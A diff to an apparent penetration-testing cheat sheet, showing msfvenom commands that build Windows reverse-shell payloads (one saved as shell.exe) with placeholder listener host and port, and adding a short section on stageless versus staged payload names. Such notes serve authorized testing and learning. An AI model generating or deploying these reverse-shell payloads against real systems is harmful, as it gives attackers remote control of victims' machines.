@@ -13,3 +13,15 @@ Generate shell examples
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port>
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe
 ```
+
+## Stageless vs. staged payloads
+
+Stageless
+```bash
+shell_reverse_tcp
+```
+
+Staged 
+```bash
+shell/reverse_tcp
+```
